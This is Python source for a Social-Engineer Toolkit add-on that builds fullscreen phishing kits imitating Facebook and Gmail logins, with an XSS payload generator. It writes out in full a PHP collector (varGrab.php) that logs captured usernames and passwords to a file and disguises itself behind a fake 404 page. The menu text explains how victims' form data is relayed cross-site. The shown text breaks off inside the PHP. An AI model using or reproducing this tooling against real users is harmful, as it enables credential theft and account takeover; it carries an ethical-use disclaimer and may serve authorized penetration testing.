# -*- coding: utf-8 -*-
#!/usr/bin/env python
#---------------------------------------------------------------------------------
# ATTENTION: UTF 8 is for non xss fullscreen attacks that have actual html code in the functions
# If this is converted to python3 utf8 coding can be taken out.
#---------------------------------------------------------------------------------
#
#      Addon Category:  Web Attacks
#	   Attack Type:     Full Screen Attacks / SET Addon Module
#      Author:          d4rk0
#      Twitter:         @d4rk0s
#	   Version:         1.0
#	   File:            fsattacks.py
#	   Purpose:         This holds every class/method for the setoolkit fullscreen attacks under the website attacks category 
#                       including the XSS Fullscreen Generator Code :P
#      License:         None This Code is For the Company TrustedSec and whatever they would like to do with it!
#                       And Free for anyone else to take modify/distribute this take this whole header out whatever
#                       I just ask you give me some sort of credit.
# 
#       ---------------------------------------------------------------------------------
#       Attention: ** Read the README on how to implement and use this please. Ive made it extremely easy **
#                      I also Started porting it to python3 right now it only runs with python 2.x 
#                      I could port it over to python3 within a couple days if its serious?
#        ---------------------------------------------------------------------------------
#       Disclaimer:
#
#       This is designed purely for good and not evil. If you are planning on using     
#       this tool for malicious purposes that are not authorized you are violating the terms       
#       of service and license of this application. This is for Ethical/Proper phishing/pentesting 
#       Testing ONLY! Leave this Disclaimer on this code if you reuse the code. Any other
#       options on this program used in a malicious way is not attended and not supported!
#       The utf8 coding at the top is due to the HTML code from the websites for the FullScreen
#       html are actually implemented in this code.
#       ---------------------------------------------------------------------------------
#       The Same Agreement applies to this module / toolset/fullscreen attacks that you agreed to
#       upon installing setoolkit by david kennedy of trustedsec
#
#########################################################################


import string
import time
import re
import os
import sys
import multiprocessing
import subprocess
import shutil, errno
import shutil
from src.core.setcore import *

class fullScreenAttacks():


    def __init__(self):
	# Strings for application
        self.menuTextFullScreen = ""
        self.inputData = ""
        self.inputDataTwo = ""
        self.results = ""
        self.aboutFullScreenFooter = ""
        self.countDracula = ""
        self.pathCheck = ""
        self.absolutePath = ""
        self.pathDivider = ""
        self.xssProgramName = ""
        self.displayCWD = ""
        self.imageHold = ""
        # Names of Fullscreen Folders/Subfolders Might change if names changed or something
        self.dirFullScreenAol = self.findFullScreenDir("AOL")
        self.dirFullScreenOutLook = self.findFullScreenDir("OUTLOOK")
        self.dirFullScreenGmail = self.findFullScreenDir("GMAIL")
        self.dirFullScreenTwitter = self.findFullScreenDir("TWITTER")
        self.dirFullScreenFacebook = self.findFullScreenDir("FACEBOOK")
        # XSS Image Names May Change on user Picks
        self.gmailLoginImage = "glogin.png"
        self.fbLoginImage = "flogin.png" 

	# Lists
        self.storageList = []
        # Dictonary
        self.storageDict = {}
	# Tuples

  

   ################################################################################
   ################################################################################

    def findFullScreenDir(self,dirName):
    # Simply check for Directory that holds all the FullScreen Files for moving ( GMAIL,FACEBOOK,TWITTER,OUTLOOK,AOL,CUSTOM)
    # nothing advanced but if for some reason directory names become lower case we check 
 
        if os.path.exists(dirName):
            return dirName 
        elif os.path.exists(str(dirName.lower())):
            return dirName.lower()
        else:
            # Directory not found
            return "NOT:FOUND"

   ################################################################################
   ################################################################################

    def phishMenuMain(self,menuDisplay = True):
    # This is the main menu function that displays the main intro menu
    # after they pick Full Screen Attacks off the WebSite Attack category
        
        if menuDisplay == True:
            # Display the menu also True on Default
            fullScreenAttackMsg = """

        \tFullScreen API Attack written by @d4rk0s

        \n\n\t FullScreen API Attacks Are Listed Below

         [!] This Addon is in BETA state much more will be added
             Enjoy & Remember Being Creative has endless possibilities   
             
         The first method will simply generate preconfigured
         FullScreen files you can edit and upload to your own server.
              
         The Second Method will generate FullScreen 
         Payload for you to use on a targeted website 
         that has a XSS vuln and can display JavaScript
         Tricking the user into thinking there clicking on 
         a Login link from the actual Targeted Website ( Ex: FaceBook ) 
         or whatever you can think of doing. 
        """      

            self.outputText(fullScreenAttackMsg,"darkgreen")

            fullScreenOptions = """
             
        [!] FullScreen API Website Attacks 
 
         1) FullScreen Attacks
         2) XSS FullScreen Payload Generator
 
        99) Return Back to Webattack menu
        """

            self.outputText(fullScreenOptions,"yellow")

        # Lets Grab the input
        self.displayPrompt()

        # Lets Decide What to do here
        # Check if they wanna Exit
        try:
            # Check if user wants to display main menu
            if str(self.inputData[0].replace(" ","")) == "" or str(self.inputData[0].replace(" ","")) == " ":
                # Enable True for Prompt Return after Display
                # Return back to prompt  
                self.phishMenuMain(False)

            # Display the FullScreen Menu for FullScreen Site Generation
            elif str(self.inputData[0].replace(" ","")) == "1":
                self.phishMenuFullScreen() 


            # Display XSS FullScreen Generator for sites with xss :D
            elif str(self.inputData[0].replace(" ","")) == "2":
                self.xssFullScreenGenerator()

            # \/ EDIT THE EXIT FUNCTION
            # Exit and Return back to WebAttack Menu
            elif str(self.inputData[0].replace(" ","")) == "99":
                # ***********************************************************************************************************
                #  *********** TODO: add the function to bring the user back to the Web Attacks SET Main Menu  in this method
                self.exitFullScreenPhish()
            # Spit Error nothing Good
            else:
                # err loop back to prompt throw error message
                self.outputText("\n\n[!] Error Please Select A Correct Option!\n\n","green") 
                # Return back to prompt  
                self.phishMenuMain(False)

        # Two Exception Errors TODO: Add SETS Logging maybe?
        except TypeError:
            pass 
 

   ################################################################################
   ################################################################################

    def phishMenuFullScreen(self,menuDisplay = True):
    # This is the  menu for FullScreen Attacks default auto displays menu Y

        if menuDisplay == True:
            # Display Menu To See what the user wants to do?
            self.menuTextFullScreen = """
        \n\n\t FullScreen API Website Attacks Are Listed Below
\n
        [?] This Attack Works Well with Linux,Windows & Mac 
            FireFox, Chrome, Safari 6 (on OS X 10.8 Mountain Lion). 

	 [!]  PHP Must Be Installed.
              PHP is added for sending the information also it grabs
              more information on the user including GEOLOCATION of IP 
              Browser Agent and a bunch of other things. 

        [-] Full-Screen Web Attacks
 
         1) Facebook Full-Screen Attack
         2) Gmail Full-Screen Attack
     

        99) Return to Main Menu
       """

	    # Display Main PhishFood FullScreen Attack Menu
            self.outputText(self.menuTextFullScreen,"white")   
            # goto sleep b****
            time.sleep(1)



	 # Lets Grab the input
        self.inputData = self.displayPrompt("FullScreen")
       
        # Lets Decide What to do here
        try:
            # Check if user wants to display FullScreen Generator Menu
            if str(self.inputData[0]) == "" or str(self.inputData[0]) == " ":
                self.phishMenuFullScreen(False)
            # Exit FullScreen Generator return to main fullscreen attack
            if str(self.inputData[0]) == "99":
                self.phishMenuMain()
            # Display About Menu
            elif str(self.inputData[0]) == "0":
                self.displayAboutFullScreen()
            # FaceBook Attack
            elif str(self.inputData[0]) == "1":
                self.deployFullPhish("FB")               
            # GMAIL Attack
            elif str(self.inputData[0]) == "2":
                self.deployFullPhish("GMAIL")
            # TWITTER Attack ----- NOT DONE
            elif str(self.inputData[0]) == "3":
                self.deployFullPhish("TWITTER")
            # Gmail Attack ------ NOT DONE
            elif str(self.inputData[0]) == "4":
                self.errorOutput("\n\n [!] GMAIL FullScreen isn't done yet","blue")   
             # Outlook Attack ----- NOT DONE
            elif str(self.inputData[0]) == "5":
                self.errorOutput("\n\n [!] Outlook FullScreen isn't done yet","blue")   
            # Spit Error nothing Good
            else:
                # err loop back to prompt throw error message
                self.outputText("\n\n[!] Error Please Select A Correct Option!\n\n","yellow")   
                # Return to correct prompt for more commands after err
                self.phishMenuFullScreen(False)
        # Two Exception Errors
        except (UnboundLocalError,TypeError):
            pass


   ################################################################################

    def xssFullScreenGenerator(self,menuDisplay = True):
    # This is the  menu for XSS FullScreen Generator , TRUE on default for menu display


        if menuDisplay == True:

            # Display Banner
            self.inputData = """
        \n
           __________________________________________
                                                   
            Welcome to SETs XSS FullScreen Generator   
           __________________________________________
        """
            self.outputText(self.inputData,"green")
        # Display Remember Please
            self.inputData = """
        [!] Please Remember: 
            Keep the File & Folder Order of which 
            the files are generated & kept in 
            when placing or uploading to the ethical
            attack server. 
            Because this is an 
            XSS Payload we want to make sure every single file
            has an 'Absolute' Path opposed to 'Relative'.
            The header.js file is really the only file
            that really needs absolute paths specified.
        \n
        """
            self.outputText(self.inputData,"yellow")   

            # ZzzZ for user display
            time.sleep(5)

            # Display Menu To See what the user wants to do?
            menuTextFullScreen = """

        [!] XSS FullScreen Generator

        [?] This Attack Works Well with Linux,Windows & Mac 
            FireFox, Chrome, Safari 6 (on OS X 10.8 Mountain Lion). 

        [!] Relay Methods to receive the form data are as 
            followed and some methods wont work in certain 
            browsers ( cross site scripting )
            but others will in mostly all browsers.

        Information Relay Methods:

        Cross Site Request / Mix Methods:

         Currently I only wanted to include mix/methods 
         because I felt including websockets would be pointless A)
         Because we dont care about responding and communicating with
         the client we just want the info & B) Websockets
         wont work 100% of the time because of security 
         with cross site scripting unless it's a stored XSS attack. 
         Not to mention websockets will work in some browsers but 
         might not send the data due to Cross Site Requests.
         But Still for what we need ( only user information ) a one way method 
         that will work with Safari Chrome and Firefox has been added. 
         Mixed Methods are various methods to communicate 
         the form / information back to you from the victim. 
         Such as implementing a constructed image attribute 
         tag with localhost/?a=INFO to relay the information
         cross site using JavaScript. This method along with
         various other ones are all used to send the Data. 
         Infact most of the time, the data is received
         numerous times because all methods have worked.


        [-] XSS Full-Screen Generator Web Attacks
 
         1) Facebook Full-Screen Attack
       //2) Custom Full-Screen Attack Generator
        99) Return to Main Menu
       """

            # Display Main PhishFood FullScreen Attack Menu
            self.outputText(menuTextFullScreen,"white")   
            # goto sleep b****
            time.sleep(.5)
 
	# Lets Grab the input
        self.inputData = self.displayPrompt("XSS")
       
        # Lets Decide What to do here
        try:
            # Check if user wants to display XSS Generator Menu
            if str(self.inputData[0]) == "" or str(self.inputData[0]) == " ":
                self.xssFullScreenGenerator(False)
            # Exit FullScreen Generator return to main fullscreen attack
            if str(self.inputData[0]) == "99":
                self.phishMenuMain()
            # FaceBook Attack
            elif str(self.inputData[0]) == "1":
                self.deployFullXSS("FB")               
            # Custom - Fullscreen Message should finish?
            elif str(self.inputData[0]) == "2":
                # nothing not fully done yet display text
                 self.errorOutput("\n\n [!] Custom Full-Screen XSS Generator not done yet","blue","XSS")   
            else:
                # err loop back to prompt throw error message
                self.errorOutput("\n\n[!] Error Please Select A Correct Option!\n\n","yellow","XSS")   

        # Two Exception Errors
        except (UnboundLocalError,TypeError):
            pass


    #####################################################
    #####################################################

    def customFullScreenGenerator(self):
        pass


    #####################################################
    #####################################################
    
    def deployFullXSS(self,typeOf):
    # Asks Questions and Deploys Specific XSS Generator Payload n File for Usage  
  
        # init storage dictionary
        self.storageDict = {
        "url"                  : "http://localhost/",
        "redirect"             : "unknown",
        "accountType"          : "unknown",
        "imgDirPath"           : "unknown",
        "imgDirXSS"            : "unknown",
        "spoofWebURLCaption"   : "unknown",
        "spoofWebURL"          : "unknown",
        "spoofWebTitle"        : "Untitled",
        "spoofWebStyleSheet"   : "unknown",
        "spoofWebJS1"          : "unknown",
        "spoofWebJS2"          : "unknown",
        "spoofWebJS3"          : "unknown",
        "spoofWebJS4"          : "unknown",
        "spoofWebJS5"          : "unknown",
        "uploadPath"           : "unknwon",
        "cssFolderStatus"      : 1,
        "jsFolderStatus"       : 1,
        "imgFolderStatus"      : 1,
        "cssFinalDest"         : "css",
        "jsFinalDest"          : "js",
        "imgFinalDest"         : "img",
        "bufferOne"            : "unknown",
        }


        # now Clear screen and begin with creation
        self.displayProperOSClear()


        # SET Account Type to what user picked
        if typeOf == "FB": self.storageDict["accountType"] = "Facebook"
        elif typeOf == "GMAIL": self.storageDict["accountType"] = "Gmail"
        else: self.storageDict["accountType"] = "Unknown"              

        # FIRST question / Absolute file path
        self.inputData = """\n
         [?]   An Absolute Path is needed so all files
             can be directly linked during the XSS
             attack inside the HTML file. In the example 
             below the folders have been placed in the
            'Attackfiles' directory on that computer '/var/www/Attackfiles'.

         [?]
               Using your own private IP for ethical pentesting? 
             Think about looking into free services like 
             noip.com so you have a constant absolute
             path no matter what IP you have. And if you do only
             have an IP address that still works fine on an absolute path.

         [Examples]
            
            Ex: <img src="http://www.SITE.net/Attackfiles/img/fbLogin.png">
            [ So the Absolute path would be http://www.SITE.net/Attackfiles ]

            Ex: <img src="http://96.35.2.12/Attackfiles/img/fbLogin.png">
            [ So the Absolute path would be http://96.35.2.12/Attackfiles ]

        \n
        """
        self.outputText(self.inputData,"yellow")   
        # Ask first question
        self.results = raw_input("\nSpecify Absolute Host Path of Where Files Will be (Ex: www.site.net/folder ):\n")  
        # check if its empty    
        if len(str(self.results.replace(" ","")))  == 0 or len(str(self.results)) > 9000:
            self.errorOutput("\n [!] Error no Specified Absolute Host Path!","blue","XSS")   
        else:
            # Make sure it doesn't have an ending /
            if self.results[len(self.results)-1] == "/":
                # Add Absolute Path to dictionary minus last / character
                self.storageDict["url"] = self.results[0:len(self.results)-1]
            else:
                # Add Absolute Path to Dictionary
                self.storageDict["url"] = str(self.results)

        # SECOND question / the title of the page
        self.inputData = """\n
        [?] This is the page title of the
            XSS page displaying the link.
            Normally it doesn't matter
            sometimes it does. It's mostly
            up to the person crafting the
            attack.
            Pressing Enter leaving it blank will 
            keep default settings of blank

        \n
        """
        self.outputText(self.inputData,"white")   
        # Ask first question
        self.results = raw_input("\nWhat Do you want the Page Title displaying the link to be?: ")  
        # check if its empty    
        if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
            # SET DEFAULT BLANK
            self.storageDict["spoofWebTitle"] = " "
        else:
            # no heavy checking for now didnt really feel a need
            self.storageDict["spoofWebTitle"] = self.results


        # THIRD question / actual spoofed URL
        self.inputData = """\n
        [?] This is the URL Address thats displayed and
            spoofed in the victims browser. When
            they rollover the URL link with their
            mouse and see.
            Pressing Enter leaving it blank will 
            keep the default settings
        \n
        """
        self.outputText(self.inputData,"cyan")   
        # Ask first question
        self.results = raw_input("\nWhat should the URL Address be Spoofed to?( Ex: http://www.gmail.com/voice/ ):\n ")  
        # check if its empty    
        if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
            # SET DEFAULT URL SPOOF DEPENDING ON WHAT WAS PICKED
            if typeOf == "FB":
                self.storageDict["spoofWebURL"] = "http://www.facebook.com/"
            elif typeOf == "GMAIL":
                self.storageDict["spoofWebURL"] = "http://www.gmail.com/"           
            else:
                self.storageDict["spoofWebURL"] = "http://localhost"                
        else:
            # no heavy checking for now didnt really feel a need
            self.storageDict["spoofWebURL"] = str(self.results)

        # FOURTH question /  actual text of the spoofed url
        self.inputData = """\n
        [?] This is the Value of the spoofed
            URL. This is what the user will
            see on the actual webpage.

        \n
        """
        self.outputText(self.inputData,"red")   
        # Ask first question
        self.results = raw_input("\nWhat should the Spoofed URL Say? (Ex: Shop Facebook ): ")  
        # check if its empty    
        if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
            # SET DEFAULT URL SPOOF DEPENDING ON WHAT WAS PICKED
            if typeOf == "FB":
                self.storageDict["spoofWebURLCaption"] = "Facebook Friends"
            elif typeOf == "GMAIL":
                self.storageDict["spoofWebURLCaption"] = "Google Drive"           
            else:
                self.storageDict["spoofWebURLCaption"] = "Login now"                
        else:
            # no heavy checking for now didnt really feel a need
            self.storageDict["spoofWebURLCaption"] = str(self.results)
        
       # FIFTH question / Path where files will be uploaded to
        self.inputData = """\n
        [?] The path is where the folders & JavaScript Files for
            the attack will be generated / created in.
        \n
        """
        self.outputText(self.inputData,"green")   
        # Ask question
        self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/d/Desktop/ ):\n ")  
        # check if its empty    
        if len(str(self.results.replace(" ","")))  == 0 or len(str(self.results)) > 9000:
            # ASK AGAIN
            self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/d/Desktop/ ):\n ")  
            if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
                if os.path.exists(str(self.results)):
                    self.storageDict["uploadPath"] = str(self.results)
                else: self.errorOutput("\n[!] Error Specified Path not Found\n","yellow","XSS")
            else: self.errorOutput("\n[!] Error Nothing Specified For the Second Time\n","yellow","XSS")
        # check if path exists               
        elif os.path.isdir(str(self.results)):
            # add upload path for uploading
            self.storageDict["uploadPath"] = str(self.results)
        else:
            self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/dd/Desktop/ ):\n ")  
            if len(str(self.results.replace(" ",""))) == 0 or len(str(self.results)) > 9000:
                if os.path.isdir(str(self.results)):
                    self.storageDict["uploadPath"] = str(self.results)
                else: self.errorOutput("\n[!] Error Specified Path not Found\n","yellow","XSS")
            else: self.errorOutput("\n[!] Error Nothing Specified For the Second Time\n","yellow","XSS")

        # LETS GENERATE THE FILES NOW
        self.outputText("\n [x] Attempting to Write Files to Directory \n","magenta")
   
        # Grab Path Divider ( POSIX OR WINDOWS BASICALLY )
        self.inputData = self.storageDict["uploadPath"]

        # Get operating system path divider
        self.pathDivider = self.returnPathDivider(self.inputData)

        # Craft and write Test file         
        self.saveFile(self.storageDict["uploadPath"] + self.pathDivider + "test.txt","SET FULLSCREEN TESTING","text")
        if os.path.isfile(self.storageDict["uploadPath"] + self.pathDivider + "test.txt"):
            self.outputText("\n[x] Directory Success: Permission to Write Folders and Files :D \n","green")
            # Delete test file or try no check
            os.remove(self.storageDict["uploadPath"] + self.pathDivider + "test.txt")
        else:               
            self.errorOutput("\n[!] Error Couldn't Write File. Check Permissions Please \n","yellow","XSS")

        # No other folders should be present with the names
        # js,img or css ... present user with alternative path

        # Check if 'CSS' Folders Already Exist
        if os.path.isdir(self.storageDict["uploadPath"] + self.pathDivider + "css") or os.path.isdir(self.storageDict["uploadPath"] + self.pathDivider + "js") or os.path.isdir(self.storageDict["uploadPath"] + self.pathDivider + "img"):
            self.inputData = """\n
        [?] There was a Folder already present
            with a named needed by the fullscreen XSS
            generator files and folders. Please delete that
            'img' 'js' or 'css' folder or select another upload
            path now. To quit and delete folders type 'quit' or 'q'
        \n
            """
            self.outputText(self.inputData,"blue") 
            self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/dd/Desktop/attacks/ ):\n ")  
            # check if they wanna just exit
            if str(self.results).lower() == "quit" or str(self.results[0]).lower() == "q":
                self.outputText("[!] Leaving and returning to FullScreen Attack Main Menu","yellow") 
                self.phishMenuMain()
            # if its not a directory throw error
            elif not os.path.isdir(self.results):
                self.results = raw_input("\nSpecify the Path/Directory to Generate and upload the files to: (Ex: /home/dd/Desktop/ ):\n ")
                if str(self.results).lower() == "quit" or str(self.results[0]).lower() == "q":
                    self.outputText("[!] Leaving and returning to FullScreen Attack Main Menu","yellow") 
                    self.phishMenuMain()
                # if its not a directory throw error
                elif not os.path.isdir(self.results):
                    self.errorOutput("[!] Error No Directory Found Sir, Sorry Returning to Menu","yellow","XSS")
                else: self.storageDict["uploadPath"] = str(self.results)
            else: self.storageDict["uploadPath"] = str(self.results)
                

        # SET THE REST OF THE DICT VALUES
        self.xssProgramName = "varGrab.php" # PHP PROGRAM THAT GRABS THE POST VARIABLES SENT TO IT
        # Create the Rest of the Dictionary Variables
        self.storageDict["imgDirPath"] =  "../" + self.storageDict["imgFinalDest"] + "/" # FOR THE CSS STYLE SHEETS IMG FOLDER LOCATION
        self.storageDict["spoofWebStyleSheet"] =  self.storageDict["url"] + "/" + self.storageDict["cssFinalDest"] + "/" + "style.css" # ABSOLUTE OF CSS

        # Check Account type for XSS image Path Creation
        if typeOf == "FB":

            # build image path
            self.imageHold = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + self.gmailLoginImage 
            # Check if login image is present
            if os.path.isfile(self.imageHold):
                # Create the Absolute path with url of XSS Image
                self.storageDict["imgDirXSS"] =  self.storageDict["url"] + "/" + self.storageDict["imgFinalDest"] + "/" + self.gmailLoginImage
            else:
                self.outputText("[!] Error, Gmail Fullscreen XSS Gmail Image Not Found.","yellow") 

        # GMAIL TYPE SET PHISH/CUSTOM IMAGE
        elif typeOf == "GMAIL": 
            # build image path
            self.imageHold = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + self.gmailLoginImage 
            # Check if login image is present
            if os.path.isfile(self.imageHold):
                # Create the Absolute path with url of XSS Image
                self.storageDict["imgDirXSS"] =  self.storageDict["url"] + "/" + self.storageDict["imgFinalDest"] + "/" + self.gmailLoginImage
            else:
                self.outputText("[!] Error, Gmail Fullscreen XSS Gmail Image Not Found.","yellow") 

        self.storageDict["spoofWebJS1"] =  self.storageDict["url"] + "/" + self.storageDict["jsFinalDest"] + "/libs/" + "jquery-1.7.2.js" # JS FILE 1
        self.storageDict["spoofWebJS2"] =  self.storageDict["url"] + "/" + self.storageDict["jsFinalDest"] + "/libs/" + "browser-detect.js" # JS FILE 2
        self.storageDict["spoofWebJS3"] =  self.storageDict["url"] + "/" + self.storageDict["jsFinalDest"] + "/libs/" + "fullscreen-api-shim.js" # JS FILE 3
        self.storageDict["spoofWebJS4"] = self.storageDict["url"]+"/"+self.storageDict["jsFinalDest"]+"/libs/"+"jquery-ui-1.8.18.custom.min.js"#JSFILE4
        self.storageDict["spoofWebJS5"] =  self.storageDict["url"] + "/" + self.storageDict["jsFinalDest"] + "/" + "script.js" # JS FILE 5
        self.storageDict["url"] =  self.storageDict["url"] + "/" + self.xssProgramName + "?uL=" # THE FULL URL WITH uL POST VARIABLE

        ######

        # Done with Folders lets Craft Code and upload files to folders create XSS Payload  
        # IF FACEBOOK
        if typeOf == "FB": 
            self.outputText("\n[x] Copying/Moving Folders & Creating Facebook Files.......\n","magenta")
        
        # Copy the rest of the img files now
        self.outputText("\n[x] Attempting to move IMG Files to the IMG Directory.......\n","red")
        if typeOf == "FB":
            imageFileDirectory = os.getcwd() + self.pathDivider  + self.dirFullScreenFacebook + self.pathDivider  + "img"
        elif typeOf == "GMAIL":
            imageFileDirectory = os.getcwd() + self.pathDivider  + self.dirFullScreenGmail + self.pathDivider  + "img"
        
        newImgDirectory = self.storageDict["uploadPath"] + self.pathDivider + self.storageDict["imgFinalDest"]
        err = self.copyJunk(imageFileDirectory,newImgDirectory)
        if err == "COPY":
            pass 
        time.sleep(1)

        # Copy all javascript files to js directory
        self.outputText("\n[x] Attempting to move JS Files to JS Folder.......\n","cyan")
        self.storageDict["jsFinalDest"] = "js"

        if typeOf == "FB":
            # if path exists lets try to move n copy it
            if os.path.exists(os.getcwd() + self.pathDivider  + self.dirFullScreenFacebook + self.pathDivider  + "js"):
                jsCompletePath = os.getcwd() + self.pathDivider  + self.dirFullScreenFacebook + self.pathDivider  + "js"
            else:
                self.errorOutput("[!] Error Couldn't Find the js Folder for Moving and Altering  ","yellow","XSS")
        
        if typeOf == "GMAIL":
            # if path exists lets try to move n copy it
            if os.path.exists(os.getcwd() + self.pathDivider  + self.dirFullScreenGmail + self.pathDivider  + "js"):
                jsCompletePath = os.getcwd() + self.pathDivider  + self.dirFullScreenGmail + self.pathDivider  + "js"
            else:
                self.errorOutput("[!] Error Couldn't Find the js Folder for Moving and Altering  ","yellow","XSS")

        # Create new Directory to upload to 
        newJSDirectory = self.storageDict["uploadPath"] + self.pathDivider + self.storageDict["jsFinalDest"]
        # Move Files now
        err = self.copyJunk(jsCompletePath,newJSDirectory)
        if err == "COPY":
            pass
              
        # Create CSS FOLDER
        self.inputData = self.createDirectory("css",self.storageDict["uploadPath"],self.pathDivider)
        if self.inputData == False:
            # Try to create again
            self.inputData = self.createDirectory("css",self.storageDict["uploadPath"],self.pathDivider)
            if self.inputData == False:
                self.errorOutput("[!] Error Couldn't Create the 'css' folder to specified upload path Check Permissions  ","blue","XSS")
        else:
            self.storageDict["cssFinalDest"] = "css"

        h = []
        if typeOf == "FB":
            # Grab CSS File code for writing stored in a list not a string  
            h.append(self.XSSGenCodeCSS(self.storageDict["imgDirPath"],"FB")) 
        

        # create CSS file path for uploading  * UNIVERSAL FOR ANY TYPE EVEN CUSTOM
        self.inputDataTwo =  self.storageDict["uploadPath"] + self.pathDivider + self.storageDict["cssFinalDest"] + self.pathDivider +  "style.css"   

             
        # Write CSS File to CSS Folder and specified destination
        # anything multiline should be put into a list or tuple
        self.saveFile(self.inputDataTwo,h,"text")
        # ZzZz
        time.sleep(1) 

        # check file is present
        if os.path.isfile(self.inputDataTwo):   
            
            j = []
            if typeOf == "FB":
                # create custom header.js file code append to list
                j.append(self.XSSGenCode(self.storageDict,"MIX"))

            # create header.js file path for uploading
            self.inputDataTwo =  self.storageDict["uploadPath"] + self.pathDivider + self.storageDict["jsFinalDest"] + self.pathDivider + "header.js"        
        
            # Write header.js file
            self.saveFile(self.inputDataTwo,j,"text")
            time.sleep(1)
            # if file isn't present throw error permissions probably
            if not os.path.isfile(self.inputDataTwo):
                self.errorOutput("[!] Error Can't Upload Custom XSS 'header.js' File to Folder, Check Permissions.","yellow","XSS")

            if typeOf == "GMAIL":
            
                # create custom header file
                j.append(self.gmailXSSGenCode(self.storageDict))

        b = []
        # Create Final PHP file that listens for the POST data to be sent    
        if typeOf == "FB":

            # create custom varGrab.php file code append to list
            b.append(self.XSSGenPHPCode())

            # create varGrab.php file path for uploading
            self.inputDataTwo =  self.storageDict["uploadPath"] +  self.pathDivider +"varGrab.php"        

            # Write header.js file
            self.saveFile(self.inputDataTwo,b,"text")

            time.sleep(1)
            # if file isn't present throw error permissions probably
            if not os.path.isfile(self.inputDataTwo):
                self.errorOutput("[!] Error Can't Upload Custom XSS 'varGrab.php' File to Folder, Check Permissions.","yellow","XSS")
                             
        else:
            self.errorOutput("[!] Error Can't Upload Custom XSS 'style.css' File to Folder, Check Permissions.","yellow","XSS")   

        # Display Success Bring User back to XSS gen menu
        self.errorOutput("[*] Success: Files Have been Written Returning back to XSS Gen Menu","green","XSS")
        # return back to prompt for commands or to exit?
        self.xssFullScreenGenerator(False) 
                

    ###########################################################
    ###########################################################

    def createDirectory(self,folderName,uploadPath,pathDivider):
    # Create Directory return True on success False on Error

        try:
            os.makedirs(uploadPath + pathDivider + folderName)
        except OSError:
            if not os.path.isdir(uploadPath + pathDivider + folderName):
                return False
        else: 
            if os.path.isdir(uploadPath + pathDivider + folderName):    
                return True   
            else:
                return False

    #####################################################
    #####################################################

    def returnPathDivider(self,inputData):
    # Return Path Divider depending on operating system
        d = inputData.find("\\")       
        if d == -1: 
            d = inputData.find("/")                  
            if d == -1: 
                return False
            else: 
                return "/"
        else: 
            return "\\"

    #####################################################
    #####################################################

    def deleteDir(self,path):
        """ deletes the path entirely uses operating systems native commands to speed things up """

        # remove directory even if it has files
        shutil.rmtree(path, ignore_errors=True)


    #####################################################
    #####################################################

    def XSSGenPHPCode(self):
    # This Generates the PHP File that Sits on the backend / control server waiting for user credentials
  

        r = []
        self.inputData = """<?PHP
/*
 @Author: [d]4rk0
 @File:   varGrab.php
 @Description:  Allows Scipt to send information using a simple http variable post request. This script
                grabs alters and stores them on disk. Add db support if you want i wrote enough shit for free to give back :P .
                You might get multiple entries. Thats cause multiple request vectors are working sometimes certain ones fail.
                Such as the embed img or audio background requests. Writing a simple cron job
                that looks for takes out file duplicates is all that is really needed if it bothers
                you that much or you want it that automated/organized? Tested with Firefox And Chrome should work with safari also dunno
                try it out urself.. 

*/
// BEGIN SCRIPT HEAD INFORMATION
// #############################################################################################
error_reporting(0);

// START FUNCTIONS
// #############################################################################################

function obfuscatePageError($type = "HTML5"){

     if (empty($_SERVER['SERVER_NAME'])){ $server = "Domain"; }else{ $server = $_SERVER['SERVER_NAME']; }

     if ($type == "HTML5"){

         // HTML5 Error Page
         $htmlContent = "<!doctype html>
     <head>
     <meta charset=\\"utf-8\\">
     <meta http-equiv=\\"X-UA-Compatible\\" content=\\"IE=edge,chrome=1\\">
     <title>".$server." - 404 Error Page</title>
     <meta name=\\"description\\" content=\\"".$server." seems to be an error! \\">
     </head>
     <body>
     <b><h2><font color=\\"#000000\\">404 Error - Page Not Found</font></h2></b>
     </body>
     </html> ";

     }elseif($type == "HTML"){

          // Regular HTML
          $htmlContent = "<!DOCTYPE html PUBLIC \\"-//W3C//DTD XHTML 1.0 Transitional//EN\\" \\"xhtml1-transitional.dtd\\"><html lang=\\"en\\" xml:lang=\\"en  \"><head><meta http-equiv=\\"Content-Type\" content=\\"text/html; charset=utf-8\\"/><meta name=\\"alang\\" content=\\"en\\"/><meta name=\\"asid\\" content=\\"\\"/>
         <title>".$server." - 404 Error Page</title>
         <meta name=\\"description\\" content=\\"".$server." seems to be an error! \\">
         </head>
         <body>
         <b><h2><font color=\\"#000000\\">404 Error - Page Not Found</font></h2></b>
         </body>
         </html>";
   
    }else{

         // Default HTML5 Display ( Recursive function )
         obfuscatePageError();
    }

    // Echo Contents
    echo $htmlContent;
    // Exit the Script
    exit(0);

  }

// #############################################################################################

function diskAdd($data,$fileName){

    // This Opens file at end for writing if doesnt exist tries to create it
    if (is_file($fileName)){
        // Append Data No Error Handling No point really
        $file = fopen($fileName, 'a+');
        // write stream
        fwrite($file, $data);
    }else{
        // Open for Banner Appending For example of account layout
        $file = fopen($fileName, 'w');
        // write stream
        fwrite($file,"\\n  - Start of Intel Entry List <><  \\n\\n");   
        // write exmaple  
        fwrite($file,"- Entry Example= U: username P: password T: acct-website Entry Date: servers-date-stamp\\n \\n\\n= ACCOUNTS START BELOW    -------------------------------------\\n\\n");     
        // write actual data stream
        fwrite($file, $data);
    }

    // close stream
    fclose($file);

  }



// END FUNCTIONS
// #############################################################################################


// BEGIN VARIABLES ////
// TYPE of Storage Method:  disk / add DB if want
$saveType = "disk";
// Filename if both or disk is picked
/* EDIT if wanted */ $fileName = "jam.txt";

// #############################################################################################


// Grab Data for storage
$u = $_GET["uL"];
// propagate a Proper Date
$date = date('l jS \of F Y h:i:s A');

// CHECK if data is empty if so do nothing 
if (empty($u) || strlen($u) < 14){ obfuscatePageError(); }

// @Create Payload String store in file
// @filter data?: No need storing in a text file
$infoPayload = "\\n\\n".$u . " Entry Date: " . $date . "\\n\\n";
 
// CONTROL-FLOW:
